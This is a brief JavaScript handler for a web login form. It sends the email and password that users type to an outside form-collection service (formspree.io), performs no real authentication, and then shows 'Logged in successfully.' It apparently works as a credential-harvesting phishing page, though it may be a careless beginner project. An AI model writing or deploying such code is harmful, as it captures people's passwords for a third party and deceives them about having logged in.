const form = document.querySelector('#login-form');
const message = document.querySelector('#form-message');

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const data = {
    email: form.email.value,
    password: form.password.value,
  };

  try {
    const res = await fetch('https://formspree.io/f/mjgndqzj', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
    });

    if (res.ok) {
      message.textContent = 'Logged in successfully.';
      form.reset();
    } else {
      message.textContent = 'Something went wrong. Please try again.';
    }
  } catch {
    message.textContent = 'Network error. Please try again.';
  }
});
